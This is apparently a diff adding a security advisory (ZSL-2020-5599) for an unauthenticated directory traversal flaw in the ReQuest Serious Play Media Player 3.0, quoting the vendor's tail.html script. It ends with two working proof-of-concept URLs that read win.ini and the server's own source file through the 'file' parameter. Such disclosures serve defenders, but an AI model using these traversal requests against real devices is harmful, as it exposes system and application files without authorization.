@@ -1,0 +1,94 @@
+# Exploit Title: ReQuest Serious Play Media Player 3.0 - Directory Traversal File Disclosure Vulnerability
+# Exploit Author: LiquidWorm
+# Software Link: http://request.com/
+# Version: 3.0.0
+
+ReQuest Serious Play Media Player 3.0 Directory Traversal File Disclosure Vulnerability
+
+
+Vendor: ReQuest Serious Play LLC
+Product web page: http://www.request.com
+Affected version: 3.0.0
+                  2.1.0.831
+                  1.5.2.822
+                  1.5.2.821
+                  1.5.1.820
+
+Summary: With the MediaPlayer, ReQuest delivers video content and award-winning
+distributed music capabilities. Up to 4 MediaPlayers (15 when coupled with an
+approved NAS) can be connected through your home network to your ReQuest system,
+delivering HD video to your television in 1080p via HDMI outputs.
+
+Desc: The device suffers from an unauthenticated file disclosure vulnerability
+when input passed through the 'file' parameter in tail.html and file.html script
+is not properly verified before being used to read web log files. This can be
+exploited to disclose contents of files from local resources.
+
+===============================================================================
+/tail.html:
+-----------
+
+function load_data()
+{
+
+   var elem = $("#data");
+   $.ajax({url:"tail.html", 
+           data:{
+                 file:elem.attr("file"),
+                 start:elem.attr("nextstart"),
+                 tail:elem.attr("tail")?elem.attr("tail"):undefined,
+                 max:elem.attr("max")?elem.attr("max"):undefined},
+                 cache:false,
+                 async:true,
+                 success:show_data}
+                 );
+}
+
+function main_start()
+{
+
+   $("#data").attr({"nextstart": 0, "max": "", "tail": 10000, "update": 5, "file": "C:\\\\ReQuest\\\\mpweb\\log\\mpweb.log"});
+   window.setTimeout(load_data, 1);
+}
+
+function show_data(data, status, jqxhr)
+{
+   var data = $("filedata", data);
+   var newdata = data.attr("data");
+   var start = data.attr("start");
+   var nextstart = data.attr("nextstart");
+   var elem = $("#data");
+   var at_end = ($(document).scrollTop()>=$(document).height()-window.innerHeight-20);
+   elem.attr({tail:"", start:start, nextstart:nextstart});
+   if (newdata.length)
+      elem.append(htmlspecialchars(newdata));
+   var delay = parseFloat(elem.attr("update"))*1000;
+   if (isNaN(delay))
+      delay = 5000;
+   if (at_end)
+      $("html,body").scrollTop($(document).height());
+   window.setTimeout(load_data, delay);
+}
+
+$(document).ready(main_start);
+
+===============================================================================
+
+Tested on: ReQuestHTTP/0.1 httpserver/0.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5599
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5599.php
+
+
+01.08.2020
+
+--
+
+
+http://192.168.1.17:8001/tail.html?file=C:\\ReQuest\\mpweb\httpserver.py
+http://192.168.1.17:8001/file.html?file=C:\windows\win.ini
